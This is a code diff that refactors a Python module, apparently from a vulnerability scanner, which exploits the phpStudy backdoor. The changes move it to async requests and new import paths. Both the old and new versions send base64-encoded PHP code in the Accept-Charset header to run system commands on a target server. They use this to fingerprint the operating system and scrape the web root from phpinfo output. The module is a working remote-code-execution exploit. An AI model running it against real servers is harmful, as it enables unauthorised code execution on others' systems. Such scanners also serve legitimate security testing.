@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 
 import re
-from app.lib.utils.request import request
-from app.lib.utils.encode import base64encode
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.encode import base64encode
+from app.lib.common import get_capta, get_useragent
 
 class Phpstudy_Backdoor_Rce_BaseVerify:
     def __init__(self, url):
@@ -26,7 +26,7 @@ class Phpstudy_Backdoor_Rce_BaseVerify:
             'Accept-Language': 'zh-CN,zh;q=0.9',
         }
 
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -39,22 +39,19 @@ class Phpstudy_Backdoor_Rce_BaseVerify:
             command = "system(\"" + 'echo %swin^dowslin$1ux' %(self.capta) + "\");"
             command = base64encode(command)
             self.headers['Accept-Charset'] = command
-            req = request.get(self.url, headers = self.headers)
-            if self.capta in req.text and ('windows' in req.text or 'linux' in req.text):
-                if 'windows' in req.text:
+            req = await request.get(self.url, headers = self.headers)
+            if self.capta in await req.text() and ('windows' in await req.text() or 'linux' in await req.text()):
+                if 'windows' in await req.text():
                     self.osname = 'Windows'
-                elif 'linux' in req.text:
+                elif 'linux' in await req.text():
                     self.osname = 'Linux'
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
     
-    def webpath(self):
+    async def webpath(self):
 
         """
         获取网站根路径
@@ -66,9 +63,9 @@ class Phpstudy_Backdoor_Rce_BaseVerify:
         command = "phpinfo();"
         command = base64encode(command)
         self.headers['Accept-Charset'] = command
-        req = request.get(self.url, headers = self.headers)
+        req = await request.get(self.url, headers = self.headers)
         pattern = re.compile('<tr><td class="e">_SERVER."DOCUMENT_ROOT".</td><td class="v">(.*?)</td></tr>')
-        root_path = pattern.findall(req.text)[0]
+        root_path = pattern.findall(await req.text())[0]
         return root_path
 
 if __name__ == '__main__':
